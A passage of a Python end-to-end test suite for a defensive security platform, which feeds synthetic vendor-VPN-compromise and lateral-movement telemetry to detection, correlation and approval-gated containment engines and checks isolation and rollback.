"""
e2e_validator.py — End-to-End Validation Framework for VaultX Phase 3.

Executes all 10 validation scenarios defined in Section 13 of the VaultX project brief
for Bharat Electronics Components Pvt. Ltd. (BECPL), Pune:

  TEST  1 : Third-Party Credential Compromise & Containment
  TEST  2 : Suspicious Lateral Movement
  TEST  3 : Living-off-the-Land (LOTL) Activity
  TEST  4 : Encrypted Data Transfer Without Decryption
  TEST  5 : Unknown Attack Behaviour (Held-Out Attack Family)
  TEST  6 : Vulnerability Exposure & Exploitation Indicators
  TEST  7 : Industrial Network Anomaly (Modbus Safety Interlock)
  TEST  8 : High Network Load Stress Test
  TEST  9 : Human vs Service vs Agent Identity Classification
  TEST 10 : Isolation, Authorization & Rollback Life Cycle

Every scenario exercises the genuine VaultX backend engines end-to-end with
deterministic assertions, structured step traces, and quantitative telemetry.
"""

from __future__ import annotations

import json
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

from backend.behavioural.baseline_engine import AssetBaseline
from backend.behavioural.deviation_detector import DeviationDetector
from backend.behavioural.lotl_detector import LotlDetector
from backend.containment.action_executor import ContainmentActionExecutor
from backend.containment.approval_engine import (
    ApprovalEngine,
    AuthenticationError,
    AuthorizationError,
    IdentityRecord,
)
from backend.containment.containment_config import (
    ActionCategory,
    ActionStatus,
    ApprovalMethod,
    ContainmentConfig,
    ContainmentMode,
    OT_ALWAYS_HUMAN_APPROVAL,
    Role,
    SafetyInvariantViolationError,
)
from backend.containment.enforcement_adapters import (
    EndpointQuarantineAdapter,
    FirewallAdapter,
    OTBoundaryAdapter,
    VPNAdapter,
)
from backend.containment.policy_engine import (
    ActionProposal,
    AffectedAsset,
    ContainmentPolicyEngine,
)
from backend.containment.simulated_firewall import SimulatedFirewallManager
from backend.correlation.blast_radius_analyzer import BlastRadiusAnalyzer, OT_SAFETY_NOTE
from backend.correlation.correlation_engine import CorrelationEngine, REDIS_STREAM_INCIDENTS
from backend.correlation.infrastructure_graph import InfrastructureGraph
from backend.detection.anomaly_detector import AnomalyDetector
from backend.detection.detection_config import (
    DEFAULT_DATASET_PATH,
    FEATURE_COLUMNS,
    IDENTITY_ENCODING,
    MODEL_DIR,
    PROTOCOL_ENCODING,
)
from backend.detection.encrypted_traffic_analyzer import (
    EncryptedTrafficAnalyzer,
    compute_beacon_autocorrelation,
)
from backend.detection.signature_engine import SignatureEngine
from backend.identity.ai_agent_monitor import (
    AIAgentMonitor,
    AgentActivityEvent,
    AgentOperationalBoundary,
)
from backend.identity.identity_engine import (
    IdentityEngine,
    VALID_IDENTITY_CATEGORIES,
)
from backend.identity.vendor_session_tracker import VendorPolicy, VendorSessionTracker
from backend.ingestion.enricher import AssetIdentityEnricher
from backend.ingestion.event_schema import (
    DetectionSource,
    EventType,
    PrincipalType,
    StandardSecurityEvent,
)
from backend.ingestion.normaliser import EventNormaliser, VPNNormaliser
from backend.threat_intel.exploitation_correlator import (
    ExploitationCorrelator,
    ExploitationStage,
)
from backend.threat_intel.supply_chain_monitor import SupplyChainMonitor
from backend.threat_intel.threat_intel_feeds import ThreatIntelFeedManager
from backend.threat_intel.vulnerability_engine import VulnerabilityEngine
from backend.validation.stress_tester import StressTester, _run_coro

IST = timezone(timedelta(hours=5, minutes=30))


# ---------------------------------------------------------------------------
# Lightweight Deterministic Test Doubles (Redis & PostgreSQL DB-API / Async)
# ---------------------------------------------------------------------------


class _SyncRedisMock:
    """In-memory synchronous Redis stub supporting KV, hashes, and streams."""

    def __init__(self) -> None:
        self.kv: Dict[str, str] = {}
        self.hashes: Dict[str, Dict[str, str]] = {}
        self.streams: Dict[str, List[Dict[str, Any]]] = {}

    def get(self, key: str) -> Optional[str]:
        return self.kv.get(key)

    def set(self, key: str, value: str) -> bool:
        self.kv[key] = value
        return True

    def setex(self, key: str, ttl: int, value: str) -> bool:
        self.kv[key] = value
        return True

    def hset(
        self,
        key: str,
        field_name: Optional[str] = None,
        value: Optional[str] = None,
        mapping: Optional[Dict[str, str]] = None,
    ) -> int:
        bucket = self.hashes.setdefault(key, {})
        if mapping is not None:
            for k, v in mapping.items():
                bucket[str(k)] = str(v)
            return len(mapping)
        if field_name is not None and value is not None:
            bucket[str(field_name)] = str(value)
            return 1
        return 0

    def hget(self, key: str, field_name: str) -> Optional[str]:
        return self.hashes.get(key, {}).get(field_name)

    def hgetall(self, key: str) -> Dict[str, str]:
        return dict(self.hashes.get(key, {}))

    def hdel(self, key: str, field_name: str) -> int:
        bucket = self.hashes.get(key, {})
        if field_name in bucket:
            del bucket[field_name]
            return 1
        return 0

    def xadd(self, stream: str, fields: Dict[str, Any]) -> str:
        entries = self.streams.setdefault(stream, [])
        entry_id = f"1763424000000-{len(entries) + 1}"
        entries.append({"id": entry_id, "fields": dict(fields)})
        return entry_id


class _AsyncRedisMock:
    """In-memory async Redis stub for AssetIdentityEnricher."""

    def __init__(self) -> None:
        self.kv: Dict[str, str] = {}

    async def get(self, key: str) -> Optional[str]:
        return self.kv.get(key)

    async def setex(self, key: str, ttl: int, value: str) -> bool:
        self.kv[key] = value
        return True


class _RecordingCursor:
    """DB-API 2.0 cursor double recording all PostgreSQL SQL executions."""

    def __init__(self, conn: "_RecordingPostgresConn") -> None:
        self._conn = conn

    def __enter__(self) -> "_RecordingCursor":
        return self

    def __exit__(self, *args: Any) -> None:
        return None

    def execute(self, sql: str, params: Any = None) -> None:
        self._conn.executed_statements.append((sql.strip(), params))

    def fetchone(self) -> Any:
        return None

    def fetchall(self) -> List[Any]:
        return []


class _RecordingPostgresConn:
    """DB-API 2.0 PostgreSQL connection double capturing SQL statements & commits."""

    def __init__(self) -> None:
        self.executed_statements: List[Tuple[str, Any]] = []
        self.commits: int = 0
        self.rollbacks: int = 0

    def cursor(self) -> _RecordingCursor:
        return _RecordingCursor(self)

    def execute(self, sql: str, params: Any = None) -> None:
        self.executed_statements.append((sql.strip(), params))

    def commit(self) -> None:
        self.commits += 1

    def rollback(self) -> None:
        self.rollbacks += 1

    def statements_matching(self, substring: str) -> List[Tuple[str, Any]]:
        needle = substring.lower()
        return [
            (sql, params)
            for sql, params in self.executed_statements
            if needle in sql.lower()
        ]


class _AsyncDBConn:
    def __init__(
        self,
        assets: Dict[str, Dict[str, Any]],
        identities: Dict[str, Dict[str, Any]],
    ) -> None:
        self._assets = assets
        self._identities = identities

    async def fetchrow(self, query: str, *args: Any) -> Optional[Dict[str, Any]]:
        if "FROM becpl_nids.assets" in query:
            return self._assets.get(args[0])
        if "FROM becpl_nids.identities" in query:
            return self._identities.get(args[0])
        return None

    async def fetch(self, query: str, *args: Any) -> List[Dict[str, Any]]:
        return []


class _AsyncDBPoolCtx:
    def __init__(self, conn: _AsyncDBConn) -> None:
        self._conn = conn

    async def __aenter__(self) -> _AsyncDBConn:
        return self._conn

    async def __aexit__(self, *args: Any) -> None:
        return None


class _AsyncDBPool:
    def __init__(
        self,
        assets: Dict[str, Dict[str, Any]],
        identities: Dict[str, Dict[str, Any]],
    ) -> None:
        self.conn = _AsyncDBConn(assets, identities)

    def acquire(self) -> _AsyncDBPoolCtx:
        return _AsyncDBPoolCtx(self.conn)


class _AssetLookupAdapter:
    """Simple IP-to-asset enricher for SignatureEngine / EncryptedTrafficAnalyzer."""

    def __init__(self, mapping: Dict[str, Dict[str, Any]]) -> None:
        self._mapping = mapping

    def lookup(self, ip: str) -> Optional[Dict[str, Any]]:
        return self._mapping.get(ip)


def _seed_soc_identities() -> Dict[str, IdentityRecord]:
    return {
        "analyst@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="analyst@becpl.in",
            role=Role.ANALYST,
            is_active=True,
            department="SOC Operations",
        ),
        "operator@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="operator@becpl.in",
            role=Role.OPERATOR,
            is_active=True,
            department="SOC Operations",
        ),
        "approver1@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="approver1@becpl.in",
            role=Role.APPROVER,
            is_active=True,
            department="Plant Operations",
        ),
        "approver2@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="approver2@becpl.in",
            role=Role.APPROVER,
            is_active=True,
            department="IT Infrastructure",
        ),
        "ciso@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="ciso@becpl.in",
            role=Role.SECURITY_MANAGER,
            is_active=True,
            department="Cybersecurity",
        ),
        "admin@becpl.in": IdentityRecord(
            identity_id=uuid.uuid4(),
            principal_name="admin@becpl.in",
            role=Role.ADMIN,
            is_active=True,
            department="IT Security",
        ),
    }


# ---------------------------------------------------------------------------
# Validation Result Data Models
# ---------------------------------------------------------------------------


@dataclass
class AssertionRecord:
    """Single assertion check performed inside a validation scenario."""

    name: str
    passed: bool
    detail: str = ""


@dataclass
class ValidationResult:
    """Structured result for one Section 13 E2E validation scenario."""

    test_id: str
    name: str
    passed: bool
    duration_ms: float
    assertions_passed: int
    assertions_total: int
    summary: str
    metrics: Dict[str, Any] = field(default_factory=dict)
    assertions: List[AssertionRecord] = field(default_factory=list)
    error: Optional[str] = None
    executed_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "test_id": self.test_id,
            "name": self.name,
            "passed": self.passed,
            "status": "PASS" if self.passed else "FAIL",
            "duration_ms": round(self.duration_ms, 2),
            "assertions_passed": self.assertions_passed,
            "assertions_total": self.assertions_total,
            "summary": self.summary,
            "metrics": self.metrics,
            "assertions": [asdict(a) for a in self.assertions],
            "error": self.error,
            "executed_at": self.executed_at,
        }


@dataclass
class ValidationSuiteReport:
    """Aggregated execution report across all 10 validation scenarios."""

    suite_name: str
    organisation: str
    executed_at: str
    total_tests: int
    passed_tests: int
    failed_tests: int
    pass_rate_pct: float
    total_duration_ms: float
    total_assertions_passed: int
    total_assertions: int
    results: List[ValidationResult]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "suite_name": self.suite_name,
            "organisation": self.organisation,
            "executed_at": self.executed_at,
            "total_tests": self.total_tests,
            "passed_tests": self.passed_tests,
            "failed_tests": self.failed_tests,
            "pass_rate_pct": round(self.pass_rate_pct, 2),
            "total_duration_ms": round(self.total_duration_ms, 2),
            "total_assertions_passed": self.total_assertions_passed,
            "total_assertions": self.total_assertions,
            "overall_status": "PASS" if self.failed_tests == 0 else "FAIL",
            "results": [r.to_dict() for r in self.results],
        }


class _ScenarioContext:
    """Assertion accumulator helper for deterministic scenario execution."""

    def __init__(self) -> None:
        self.assertions: List[AssertionRecord] = []

    def check(self, name: str, condition: bool, detail: str = "") -> None:
        self.assertions.append(
            AssertionRecord(name=name, passed=bool(condition), detail=detail)
        )
        if not condition:
            raise AssertionError(f"Assertion failed [{name}]: {detail}")


# ---------------------------------------------------------------------------
# End-to-End Validator
# ---------------------------------------------------------------------------


class E2EValidator:
    """
    Core VaultX Phase 3 End-to-End Validation Framework implementing all 10
    validation scenarios from Section 13 of the project brief.
    """

    def __init__(
        self,
        dataset_path: Optional[Path | str] = None,
        model_dir: Optional[Path | str] = None,
        stress_flow_count: int = 5000,
    ) -> None:
        self.dataset_path = (
            Path(dataset_path)
            if dataset_path is not None
            else Path(DEFAULT_DATASET_PATH)
        )
        self.model_dir = Path(model_dir) if model_dir is not None else Path(MODEL_DIR)
        self.stress_flow_count = stress_flow_count

    def _execute_scenario(
        self,
        test_id: str,
        name: str,
        fn: Callable[[_ScenarioContext], Tuple[str, Dict[str, Any]]],
    ) -> ValidationResult:
        ctx = _ScenarioContext()
        t0 = time.perf_counter()
        try:
            summary, metrics = fn(ctx)
            duration_ms = (time.perf_counter() - t0) * 1000.0
            passed_cnt = sum(1 for a in ctx.assertions if a.passed)
            return ValidationResult(
                test_id=test_id,
                name=name,
                passed=passed_cnt == len(ctx.assertions) and len(ctx.assertions) > 0,
                duration_ms=duration_ms,
                assertions_passed=passed_cnt,
                assertions_total=len(ctx.assertions),
                summary=summary,
                metrics=metrics,
                assertions=ctx.assertions,
            )
        except Exception as exc:
            duration_ms = (time.perf_counter() - t0) * 1000.0
            passed_cnt = sum(1 for a in ctx.assertions if a.passed)
            return ValidationResult(
                test_id=test_id,
                name=name,
                passed=False,
                duration_ms=duration_ms,
                assertions_passed=passed_cnt,
                assertions_total=len(ctx.assertions),
                summary=f"FAILED: {exc}",
                metrics={},
                assertions=ctx.assertions,
                error=str(exc),
            )

    # ------------------------------------------------------------------
    # TEST 1: Third-Party Credential Compromise & Containment
    # ------------------------------------------------------------------
    def run_test_01_third_party_compromise(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()
            t0 = datetime(2026, 11, 18, 2, 15, 0, tzinfo=timezone.utc)

            # 1. Emit & normalise abnormal off-hours vendor VPN authentication
            vpn_ev = VPNNormaliser().normalise(
                {
                    "source": "vpn",
                    "timestamp": t0.isoformat(),
                    "vpn_user": "vendor_hexacore_dev",
                    "remote_ip": "185.220.101.45",
                    "gateway_ip": "10.10.50.2",
                    "status": "success",
                }
            )
            ctx.check(
                "vpn_auth_normalised",
                vpn_ev.event_type == EventType.AUTH_EVENT
                and vpn_ev.evidence.get("principal_name") == "vendor_hexacore_dev",
                f"Normalized VPN auth for {vpn_ev.evidence.get('principal_name')}",
            )

            # 2. Track vendor session & unauthorized Engineering asset access
            policy = VendorPolicy(
                vendor_id=5,
                vendor_name="HexaCore Embedded Firmware Labs",
                approved_access_scope="DMZ jump host only during scheduled window",
                approved_resources={"DMZ-BASTION-01"},
                allowed_vlans={50},
                max_session_duration_hours=4.0,
                max_concurrent_sessions=1,
            )
            v_tracker = VendorSessionTracker(policies={5: policy}, redis_client=redis)
            sess_rec, _ = v_tracker.start_session(
                vendor_id=5,
                identity_id="vendor_hexacore_dev",
                source_ip="185.220.101.45",
                session_id="vsess-hexacore-001",
                start_time=t0,
            )
            scope_alerts = v_tracker.record_activity(
                session_id="vsess-hexacore-001",
                resource="ENG-WS-002",
                bytes_transferred=65536,
                timestamp=t0 + timedelta(minutes=10),
                vlan_id=20,
            )
            ctx.check(
                "vendor_session_scope_violation",
                any(a.violation_type == "vendor_scope_violation" for a in scope_alerts)
                and any(
                    a.violation_type == "vendor_vlan_scope_violation"
                    for a in scope_alerts
                ),
                f"Detected {len(scope_alerts)} vendor session policy violations on ENG-WS-002",
            )

            # 3. SupplyChainMonitor detects vendor auth anomaly & unauthorized resource access
            sc_monitor = SupplyChainMonitor(redis_client=redis)
            auth_inds = sc_monitor.check_vendor_authentication(
                {
                    "event_id": "sc-auth-001",
                    "vendor_id": "VEND-005",
                    "identity": "vendor_hexacore_dev",
                    "source_ip": "185.220.101.45",
                    "timestamp": t0.isoformat(),
                    "mfa_used": False,
                    "mfa_failed": True,
                }
            )
            res_inds = sc_monitor.check_resource_access(
                {
                    "event_id": "sc-res-001",
                    "vendor_id": "VEND-005",
                    "identity": "vendor_hexacore_dev",
                    "source_asset_id": "DMZ-BASTION-01",
                    "destination_asset_id": "ENG-WS-002",
                    "destination_port": 22,
                    "destination_vlan": 20,
                }
            )
            ctx.check(
                "supply_chain_anomalies_detected",
                any(i.indicator_type == "vendor_auth_anomaly" for i in auth_inds)
                and any(
                    i.indicator_type == "unexpected_resource_access" for i in res_inds
                ),
                "SupplyChainMonitor emitted vendor_auth_anomaly and unexpected_resource_access",
            )

            # 4. Correlate into INC-2026-001 via RULE-VENDOR-001
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            corr_engine.ingest_event(
                "detections:supply_chain",
                {
                    "event_id": "sc-auth-001",
                    "timestamp": t0.isoformat(),
                    "vendor_id": "VEND-005",
                    "identity": "vendor_hexacore_dev",
                    "indicator_type": "vendor_auth_anomaly",
                    "source_asset_id": "DMZ-BASTION-01",
                },
            )
            corr_engine.ingest_event(
                "detections:supply_chain",
                {
                    "event_id": "sc-res-001",
                    "timestamp": (t0 + timedelta(minutes=10)).isoformat(),
                    "vendor_id": "VEND-005",
                    "identity": "vendor_hexacore_dev",
                    "indicator_type": "unexpected_resource_access",
                    "source_asset_id": "DMZ-BASTION-01",
                    "destination_asset_id": "ENG-WS-002",
                    "source_vlan": 50,
                    "destination_vlan": 20,
                },
            )
            incidents = corr_engine.ingest_event(
                "detections:supply_chain",
                {
                    "event_id": "sc-vlan-001",
                    "timestamp": (t0 + timedelta(minutes=22)).isoformat(),
                    "vendor_id": "VEND-005",
                    "identity": "vendor_hexacore_dev",
                    "indicator_type": "cross_vlan_access",
                    "source_asset_id": "DMZ-BASTION-01",
                    "destination_asset_id": "ENG-WS-002",
                    "source_vlan": 50,
                    "destination_vlan": 20,
                },
            )
            vendor_inc = next(
                (i for i in incidents if i.rule_id == "RULE-VENDOR-001"), None
            )
            ctx.check(
                "incident_inc_2026_001_generated",
                vendor_inc is not None
                and vendor_inc.incident_reference == "INC-2026-001"
                and vendor_inc.severity == "high",
                f"Generated {vendor_inc.incident_reference if vendor_inc else None} ({vendor_inc.rule_id if vendor_inc else None})",
            )
            assert vendor_inc is not None

            # 5. Propose vendor session suspension & firewall block
            policy_engine = ContainmentPolicyEngine(db_conn=db)
            approval_engine = ApprovalEngine(
                policy_engine=policy_engine,
                db_conn=db,
                redis_client=redis,
                identities=_seed_soc_identities(),
            )
            fw_mgr = SimulatedFirewallManager()
            fw_adapter = FirewallAdapter(firewall_manager=fw_mgr)
            vpn_adapter = VPNAdapter()
            corr_updates: List[Tuple[uuid.UUID, str]] = []
            executor = ContainmentActionExecutor(
                policy_engine=policy_engine,
                approval_engine=approval_engine,
                adapters={
                    ActionCategory.THIRD_PARTY_CONTAINMENT: vpn_adapter,
                    ActionCategory.NETWORK_CONTAINMENT: fw_adapter,
                },
                db_conn=db,
                redis_client=redis,
                correlation_notifier=lambda iid, st, _d: corr_updates.append((iid, st)),
            )

            bastion_asset = AffectedAsset(
                asset_id="DMZ-BASTION-01",
                hostname="dmz-bastion-01.becpl.local",
                vlan_id=50,
                criticality="high",
                device_type="server",
                ip_address="10.10.50.2",
            )
            inc_uuid = uuid.UUID(vendor_inc.incident_id)
            vpn_prop = policy_engine.propose_action(
                incident_id=inc_uuid,
                affected_asset=bastion_asset,
                action_category=ActionCategory.THIRD_PARTY_CONTAINMENT,
                reason_for_isolation="Compromised HexaCore vendor VPN credential accessing VLAN 20 ENG-WS-002",
                supporting_evidence=["sc-auth-001", "sc-res-001", "sc-vlan-001"],
                parameters={
                    "session_id": sess_rec.session_id,
                    "vendor_name": "HexaCore Embedded Firmware Labs",
                },
                initiated_by="operator@becpl.in",
            )
            fw_prop = policy_engine.propose_action(
                incident_id=inc_uuid,
                affected_asset=bastion_asset,
                action_category=ActionCategory.NETWORK_CONTAINMENT,
                reason_for_isolation="Block anomalous external vendor IP 185.220.101.45 to DMZ VPN gateway",
                supporting_evidence=["sc-auth-001", "sc-res-001"],
                parameters={
                    "src_ip": "185.220.101.45",
                    "dst_ip": "10.10.50.2",
                    "port": 443,
                },
                initiated_by="operator@becpl.in",
            )
            ctx.check(
                "vendor_proposals_pending_in_mode3",
                vpn_prop.execution_status == ActionStatus.PENDING.value
                and fw_prop.execution_status == ActionStatus.PENDING.value,
                "Proposals created in pending status under MODE 3",
            )

            # 6. Approve with MFA (SECURITY_MANAGER required for THIRD_PARTY_CONTAINMENT)
            approver_blocked = False
            try:
                approval_engine.approve_action(
                    action_id=vpn_prop.action_id,
                    approver_identity="approver1@becpl.in",
                    approver_role=Role.APPROVER,
                    mfa_token="148291",
                )
            except AuthorizationError:
                approver_blocked = True
            ctx.check(
                "third_party_requires_security_manager",
                approver_blocked,
                "Tier-1 APPROVER correctly blocked from approving THIRD_PARTY_CONTAINMENT",
            )

            vpn_approval = approval_engine.approve_action(
                action_id=vpn_prop.action_id,
                approver_identity="ciso@becpl.in",
                approver_role=Role.SECURITY_MANAGER,
                mfa_token="148291",
                approval_method=ApprovalMethod.MFA_TOKEN,
            )
            fw_approval = approval_engine.approve_action(
                action_id=fw_prop.action_id,
                approver_identity="ciso@becpl.in",
                approver_role=Role.SECURITY_MANAGER,
                mfa_token="148292",
                approval_method=ApprovalMethod.MFA_TOKEN,
            )
            ctx.check(
                "mfa_approval_succeeded",
                vpn_approval.approved and fw_approval.approved,
                "SECURITY_MANAGER approved both vendor session suspension and firewall block via MFA",
            )

            # 7. Execute & verify simulated session suspension + firewall block
            vpn_exec = executor.execute_action(vpn_prop.action_id)
            fw_exec = executor.execute_action(fw_prop.action_id)
            session_after_block = vpn_adapter.get_session(sess_rec.session_id)
            fw_rule_active = fw_mgr.check_rule_exists(
                "185.220.101.45", "10.10.50.2", "TCP", 443, "BLOCK"
            )
            ctx.check(
                "session_suspended_and_firewall_blocked",
                vpn_exec.success
                and fw_exec.success
                and session_after_block is not None
                and session_after_block["session_status"] == "suspended"
                and fw_rule_active,
                "Vendor VPN session suspended and simulated firewall DROP rule verified active",
            )

            # 8. Rollback & verify restoration
            vpn_rb = executor.rollback_action(
                vpn_prop.action_id,
                actor_identity="ciso@becpl.in",
                reason="Vendor credential rotated and verified",
            )
            fw_rb = executor.rollback_action(
                fw_prop.action_id,
                actor_identity="ciso@becpl.in",
                reason="Post-remediation restore",
            )
            session_after_rb = vpn_adapter.get_session(sess_rec.session_id)
            fw_rule_removed = not fw_mgr.check_rule_exists(
                "185.220.101.45", "10.10.50.2", "TCP", 443, "BLOCK"
            )
            ctx.check(
                "rollback_restored_state",
                vpn_rb.success
                and fw_rb.success
                and session_after_rb is not None
                and session_after_rb["session_status"] == "restored"
                and fw_rule_removed,
                "Rollback restored vendor session and deactivated simulated firewall rule",
            )

            return (
                "Vendor VPN compromise correlated to INC-2026-001; MFA-approved session suspension & firewall block enforced and cleanly rolled back.",
                {
                    "incident_reference": vendor_inc.incident_reference,
                    "correlation_rule": vendor_inc.rule_id,
                    "session_id": sess_rec.session_id,
                    "scope_violations": len(scope_alerts),
                    "firewall_blocked_then_removed": fw_rule_active and fw_rule_removed,
                    "audit_entries": len(approval_engine.get_audit_logs()),
                },
            )

        return self._execute_scenario(
            "TEST-01",
            "Third-Party Credential Compromise & Containment",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 2: Suspicious Lateral Movement
    # ------------------------------------------------------------------
    def run_test_02_lateral_movement(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()
            t0 = datetime(2026, 11, 18, 10, 15, 0, tzinfo=timezone.utc)

            # 1. Emit multi-host, multi-VLAN SMB (445) / RDP (3389) / SSH (22) scan from CORP-WS-002
            scan_targets = [
                ("CORP-FS-01", "10.10.10.4", 10, 445, "smb"),
                ("CORP-DC-01", "10.10.10.2", 10, 3389, "rdp"),
                ("CORP-BACKUP-01", "10.10.10.6", 10, 445, "smb"),
                ("ENG-WS-002", "10.10.20.12", 20, 22, "ssh"),
            ]
            normaliser = EventNormaliser()
            normalised_events = []
            for idx, (dst_asset, dst_ip, dst_vlan, port, svc) in enumerate(scan_targets):
                raw_zeek = {
                    "ts": (t0 + timedelta(minutes=idx * 2)).timestamp(),
                    "uid": f"CLatMov{idx:03d}",
                    "id.orig_h": "10.10.10.22",
                    "id.orig_p": 52100 + idx,
                    "id.resp_h": dst_ip,
                    "id.resp_p": port,
                    "proto": "tcp",
                    "service": svc,
                    "duration": 0.45,
                    "orig_bytes": 420,
                    "resp_bytes": 180,
                    "orig_pkts": 4,
                    "resp_pkts": 3,
                    "conn_state": "REJ",
                }
                normalised_events.append(
                    (normaliser.normalise(raw_zeek, sensor_id="SENSOR-CORP-01"), dst_asset, dst_vlan)
                )
            ctx.check(
                "lateral_flows_normalised",
                len(normalised_events) == 4
                and all(ev.source_ip == "10.10.10.22" for ev, _, _ in normalised_events),
                "Normalized 4 SMB/RDP/SSH lateral scan flows from CORP-WS-002 across VLANs 10 & 20",
            )

            # 2. Behavioural deviation detection against CORP-WS-002 baseline
            baseline = AssetBaseline(
                asset_id="CORP-WS-002",
                entity_type="corporate_workstation",
                normal_destinations={"10.10.10.4", "10.10.10.5"},
                normal_ports={80, 443, 53},
                normal_protocols={"TCP", "UDP"},
                bytes_per_hour_mean=25_000.0,
                bytes_per_hour_std=3_000.0,
                connections_per_hour_mean=18.0,
                connections_per_hour_std=3.0,
                normal_hours=set(range(9, 19)),
                normal_peers={"CORP-FS-01", "CORP-DNS-01"},
                normal_vlans={10},
                sample_count=400,
            )
            dev_detector = DeviationDetector()
            dev_res = dev_detector.evaluate(
                {
                    "asset_id": "CORP-WS-002",
                    "timestamp": datetime(2026, 11, 18, 2, 15, tzinfo=IST),
                    "dst_ip": "10.10.20.12",
                    "dst_port": 22,
                    "dst_vlan": 20,
                    "dst_criticality": "critical",
                    "hourly_bytes": 120_000,
                    "connections_per_hour": 85,
                    "peer_asset_id": "ENG-WS-002",
                    "peer_criticality": "critical",
                },
                baseline,
            )
            ctx.check(
                "behavioural_fanout_deviation_detected",
                dev_res.is_anomaly_indicator
                and dev_res.severity in ("MEDIUM", "HIGH")
                and len(dev_res.signals) >= 4
                and any(s.name == "cross_vlan_unexpected" for s in dev_res.signals),
                f"DeviationDetector raised {dev_res.severity} (score={dev_res.combined_score:.2f}) with {len(dev_res.signals)} signals",
            )

            # 3. Correlate multi-host fan-out via RULE-CORP-001
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            triggered_incidents = []
            for idx, (ev, dst_asset, dst_vlan) in enumerate(normalised_events):
                res = corr_engine.ingest_event(
                    "detections:anomaly",
                    {
                        "event_id": f"lat-ev-{idx}",
                        "timestamp": ev.timestamp.isoformat(),
                        "source_asset_id": "CORP-WS-002",
                        "destination_asset_id": dst_asset,
                        "source_vlan": 10,
                        "destination_vlan": dst_vlan,
                        "destination_port": ev.destination_port,
                    },
                )
                triggered_incidents.extend(res)

            lat_inc = next(
                (i for i in triggered_incidents if i.rule_id == "RULE-CORP-001"), None
            )
            ctx.check(
                "lateral_movement_incident_correlated",
                lat_inc is not None
                and lat_inc.severity == "high"
                and "T1021" in lat_inc.mitre_techniques,
                f"Correlated {lat_inc.incident_reference if lat_inc else None} with MITRE T1021",
            )
            assert lat_inc is not None

            # 4. Generate Infrastructure Relationship Graph & Blast Radius
            graph = InfrastructureGraph(redis_client=redis)
            observed_flows = [
                {
                    "source_asset_id": "CORP-WS-002",
                    "destination_asset_id": dst_asset,
                    "protocol": "TCP",
                    "dst_port": port,
                    "frequency": 5,
                }
                for dst_asset, _, _, port, _ in scan_targets
            ]
            graph.ingest_observed_flows(observed_flows)
            nx_json = graph.to_networkx_json()
            anomalous_edges = graph.anomalous_edges()
            br_analyzer = BlastRadiusAnalyzer(graph=graph, db_client=db, redis_client=redis)
            br = br_analyzer.analyze(
                incident_id=lat_inc.incident_id,
                affected_assets=["CORP-WS-002"],
                recent_flows_24h=observed_flows,
            )
            ctx.check(
                "relationship_graph_and_blast_radius_generated",
                nx_json["directed"] is True
                and len(nx_json["nodes"]) > 50
                and len(anomalous_edges) >= 1
                and len(br.potentially_affected_assets) >= 3,
                f"Graph: {len(nx_json['nodes'])} nodes, {len(anomalous_edges)} anomalous edges, {len(br.potentially_affected_assets)} potentially affected assets",
            )

            # 5. Isolate CORP-WS-002 while preserving VLAN 70 Security Management path
            policy_engine = ContainmentPolicyEngine(db_conn=db)
            approval_engine = ApprovalEngine(
                policy_engine=policy_engine,
                db_conn=db,
                redis_client=redis,
                identities=_seed_soc_identities(),
            )
            q_adapter = EndpointQuarantineAdapter()
            executor = ContainmentActionExecutor(
                policy_engine=policy_engine,
                approval_engine=approval_engine,
                adapters={ActionCategory.ENDPOINT_QUARANTINE: q_adapter},
                db_conn=db,
                redis_client=redis,
            )
            ws_asset = AffectedAsset(
                asset_id="CORP-WS-002",
                hostname="corp-ws-002.becpl.in",
                vlan_id=10,
                criticality="medium",
                device_type="workstation",
                ip_address="10.10.10.22",
            )
            q_prop = policy_engine.propose_action(
                incident_id=uuid.UUID(lat_inc.incident_id),
                affected_asset=ws_asset,
                action_category=ActionCategory.ENDPOINT_QUARANTINE,
                reason_for_isolation="Multi-VLAN SMB/RDP/SSH lateral scan fan-out from CORP-WS-002",
                supporting_evidence=lat_inc.evidence,
                parameters={"quarantine_vlan": 999},
                initiated_by="operator@becpl.in",
            )
            approval_engine.approve_action(
                action_id=q_prop.action_id,
                approver_identity="approver1@becpl.in",
                approver_role=Role.APPROVER,
                mfa_token="133701",
            )
            q_exec = executor.execute_action(q_prop.action_id)
            q_rec = q_adapter.get_quarantine_record(q_prop.action_id)
            ctx.check(
                "endpoint_isolated_vlan70_preserved",
                q_exec.success
                and q_rec is not None
                and q_rec.active is True
                and q_rec.management_access_preserved is True
                and q_rec.allowed_management_cidr == "10.10.70.0/24",
                f"CORP-WS-002 quarantined to VLAN {q_rec.quarantine_vlan if q_rec else None} with VLAN 70 ({q_rec.allowed_management_cidr if q_rec else None}) preserved",
            )

            return (
                "Multi-VLAN SMB/RDP/SSH lateral fan-out detected, mapped in relationship graph, and CORP-WS-002 isolated with VLAN 70 management access preserved.",
                {
                    "incident_reference": lat_inc.incident_reference,
                    "distinct_targets_scanned": len(scan_targets),
                    "graph_nodes": len(nx_json["nodes"]),
                    "anomalous_edges": len(anomalous_edges),
                    "potentially_affected_assets": len(br.potentially_affected_assets),
                    "quarantine_vlan": q_rec.quarantine_vlan if q_rec else None,
                    "vlan70_management_cidr": q_rec.allowed_management_cidr if q_rec else None,
                },
            )

        return self._execute_scenario(
            "TEST-02",
